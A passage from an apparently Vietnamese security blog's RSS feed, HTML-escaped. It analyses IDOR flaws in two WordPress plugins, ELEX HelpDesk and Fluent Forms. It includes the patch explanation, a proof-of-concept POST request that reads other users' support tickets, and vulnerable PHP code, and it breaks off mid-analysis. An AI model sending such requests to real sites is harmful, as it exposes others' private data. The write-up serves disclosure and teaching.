class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√° v3.3.0&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/diff.png&#34; title=&#34;B·∫£n v√° v3.3.0&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;B·∫£n v√° v3.3.0&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/diff.png&#39; alt=&#34;Patch&#34; height=&#34;693&#34; width=&#34;1888&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n v√° v3.3.0&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ &lt;strong&gt;ngƒÉn ch·∫∑n IDOR b·∫±ng c√°ch r√†ng bu·ªôc quy·ªÅn truy c·∫≠p theo ng∆∞·ªùi d√πng&lt;/strong&gt;, c·ª• th·ªÉ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;So s√°nh &lt;code&gt;ticket_author&lt;/code&gt; v·ªõi &lt;code&gt;current_user_id&lt;/code&gt; ƒë·ªÉ ƒë·∫£m b·∫£o ng∆∞·ªùi xem l√† ch·ªß s·ªü h·ªØu ticket&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªâ cho ph√©p truy c·∫≠p n·∫øu ng∆∞·ªùi d√πng thu·ªôc nh√≥m ƒë∆∞·ª£c c·∫•p quy·ªÅn (&lt;code&gt;administrator&lt;/code&gt;, &lt;code&gt;WSDesk_Agents&lt;/code&gt;, &lt;code&gt;WSDesk_Supervisor&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;T·ª´ ch·ªëi m·ªçi truy c·∫≠p kh√¥ng h·ª£p l·ªá tr∆∞·ªõc khi tr·∫£ d·ªØ li·ªáu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Nh·ªù ƒë√≥, kh√¥ng th·ªÉ truy c·∫≠p ticket c·ªßa ng∆∞·ªùi kh√°c ch·ªâ b·∫±ng c√°ch thay ƒë·ªïi &lt;code&gt;ticket_id&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated User (Subcriber&amp;#43;)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Request admin-ajax.php?action=eh_crm_ticket_single_view_client&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Verify nonce&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Get ticket_id from request&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Load ticket by ticket_id&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;No ownership check&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;No role validation&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Return full ticket data&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;User can view other users&amp;#39; tickets (IDOR)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login v·ªõi Subcriber+ user:&lt;/li&gt;&#xA;&lt;li&gt;Submit 1 ticket b·∫•t k√¨&lt;/li&gt;&#xA;&lt;li&gt;T·∫°i b·∫£ng &lt;code&gt;Your Tickets&lt;/code&gt;, l·∫•y &lt;code&gt;nonce&lt;/code&gt; b·∫±ng c√°ch view source:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/nonce.png&#34; title=&#34;L·∫•y nonce&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;L·∫•y nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;513&#34; width=&#34;1346&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;L·∫•y nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;G·ª≠i request v·ªõi &lt;code&gt;nonce&lt;/code&gt; v·ª´a l·∫•y ƒë∆∞·ª£c&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: Subcriber&amp;#43; cookie&#xA;&#xA;action=eh_crm_ticket_single_view_client&amp;amp;nonce=4de88a7186&amp;amp;ticket_id=any_ticket_id &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/result.png&#39; alt=&#34;Result&#34; height=&#34;910&#34; width=&#34;1555&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Th√¥ng tin tr·∫£ v·ªÅ ch·ª©a n·ªôi dung c·ªßa ticket v√† c·∫£ th√¥ng tin author c·ªßa ticket&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra do endpoint &lt;code&gt;eh_crm_ticket_single_view_client&lt;/code&gt; &lt;strong&gt;kh√¥ng ki·ªÉm tra quy·ªÅn s·ªü h·ªØu ticket&lt;/strong&gt;, ch·ªâ d·ª±a v√†o &lt;code&gt;ticket_id&lt;/code&gt; do ng∆∞·ªùi d√πng cung c·∫•p.&#xA;ƒêi·ªÅu n√†y cho ph√©p b·∫•t k·ª≥ ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p n√†o truy c·∫≠p ticket c·ªßa ng∆∞·ªùi kh√°c ‚Üí &lt;strong&gt;IDOR&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° kh·∫Øc ph·ª•c b·∫±ng c√°ch:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;So s√°nh &lt;code&gt;ticket_author&lt;/code&gt; v·ªõi &lt;code&gt;current_user_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªâ cho ph√©p c√°c role ƒë∆∞·ª£c c·∫•p quy·ªÅn truy c·∫≠p&lt;/li&gt;&#xA;&lt;li&gt;T·ª´ ch·ªëi request n·∫øu kh√¥ng h·ª£p l·ªá tr∆∞·ªõc khi tr·∫£ d·ªØ li·ªáu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;nonce&lt;/code&gt; &lt;strong&gt;kh√¥ng thay th·∫ø cho ki·ªÉm tra ph√¢n quy·ªÅn&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng ƒë∆∞·ª£c tin d·ªØ li·ªáu ID do client g·ª≠i l√™n&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n ki·ªÉm tra &lt;strong&gt;ownership&lt;/strong&gt; tr∆∞·ªõc khi truy xu·∫•t d·ªØ li·ªáu&lt;/li&gt;&#xA;&lt;li&gt;Authorization ph·∫£i ƒë∆∞·ª£c x·ª≠ l√Ω ·ªü backend, tr∆∞·ªõc khi tr·∫£ response&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/elex-helpdesk-customer-support-ticket-system/vulnerability/wordpress-elex-wordpress-helpdesk-customer-ticketing-system-plugin-3-2-9-authenticated-subscriber-insecure-direct-object-reference-via-eh-crm-ticket-single-view-client-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System Plugin &amp;lt;= 3.2.9 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13748 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-27-cve-2025-13748/</link>
      <pubDate>Sat, 27 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-27-cve-2025-13748/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-27-cve-2025-13748/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Fluent Forms ‚Äì Customizable Contact Forms, Survey, Quiz, &amp;amp; Conversational Form Builder&lt;/strong&gt; t·ªìn t·∫°i &lt;strong&gt;l·ªó h·ªïng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n &lt;strong&gt;‚â§ 6.1.7&lt;/strong&gt; th√¥ng qua tham s·ªë &lt;code&gt;submission_id&lt;/code&gt; trong endpoint x√°c nh·∫≠n thanh to√°n SCA.&#xA;L·ªó h·ªïng cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;ƒë√°nh d·∫•u submission c·ªßa ng∆∞·ªùi kh√°c l√† failed&lt;/strong&gt;, g√¢y gi√°n ƒëo·∫°n qu√° tr√¨nh thanh to√°n.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13748&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13748&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.1.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.1.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/fluentform/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FluentForm Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;FluentForm&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.1.7&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.1.8&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω AJAX handler &lt;strong&gt;cho ng∆∞·ªùi ch∆∞a ƒëƒÉng nh·∫≠p&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_fluentform_sca_inline_confirm_payment&amp;#39;, [$this, &amp;#39;confirmScaPayment&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; l√† hook d√†nh cho ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p (k·ªÉ c·∫£ Unauthenticated). Khi c√≥ request t·ªõi endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=fluentform_sca_inline_confirm_payment&lt;/code&gt; th√¨ callback &lt;code&gt;confirmScaPayment&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function confirmScaPayment()&#xA;{&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $formId = isset($_REQUEST[&amp;#39;form_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;form_id&amp;#39;]) : 0;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $submissionId = isset($_REQUEST[&amp;#39;submission_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;submission_id&amp;#39;]) : 0;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $paymentMethod = isset($_REQUEST[&amp;#39;payment_method&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;payment_method&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $paymentIntentId = isset($_REQUEST[&amp;#39;payment_intent_id&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;payment_intent_id&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;&#xA;    $this-&amp;gt;setSubmissionId($submissionId);&#xA;    $submission = $this-&amp;gt;getSubmission();&#xA;    $this-&amp;gt;form = $this-&amp;gt;getForm();&#xA;&#xA;    $transaction = $this-&amp;gt;getLastTransaction($submissionId);&#xA;&#xA;    $confirmation = SCA::confirmPayment($paymentIntentId, [&#xA;        &amp;#39;payment_method&amp;#39; =&amp;gt; $paymentMethod&#xA;    ], $formId);&#xA;&#xA;    if (is_wp_error($confirmation)) {&#xA;        $message = &amp;#39;Payment has been failed. &amp;#39; . $confirmation-&amp;gt;get_error_message();&#xA;        $this-&amp;gt;handlePaymentChargeError($message, $submission, $transaction, $confirmation, &amp;#39;payment_error&amp;#39;);&#xA;    }&#xA;&#xA;    if ($confirmation-&amp;gt;status == &amp;#39;succeeded&amp;#39;) {&#xA;        $charge = $confirmation-&amp;gt;charges-&amp;gt;data[0];;&#xA;        $this-&amp;gt;handlePaymentSuccess($charge, $transaction, $submission);&#xA;    } else {&#xA;        $this-&amp;gt;handlePaymentChargeError(&amp;#39;We could not verify your payment. Please try again&amp;#39;, $submission, $transaction, $confirmation, &amp;#39;payment_error&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong h√†m &lt;code&gt;confirmScaPayment()&lt;/code&gt;, plugin l·∫•y &lt;code&gt;submission_id&lt;/code&gt; tr·ª±c ti·∫øp t·ª´ request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$submissionId = isset($_REQUEST[&amp;#39;submission_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;submission_id&amp;#39;]) : 0;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gi√° tr·ªã n√†y:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng ƒë∆∞·ª£c r√†ng bu·ªôc v·ªõi user hi·ªán t·∫°i&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng ƒë∆∞·ª£c ki·ªÉm tra ownership&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng ƒë∆∞·ª£c ki·ªÉm tra m·ªëi quan h·ªá v·ªõi &lt;code&gt;form_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;T·ª©c l√† b·∫•t k·ª≥ ai g·ª≠i request ƒë·∫øn endpoint 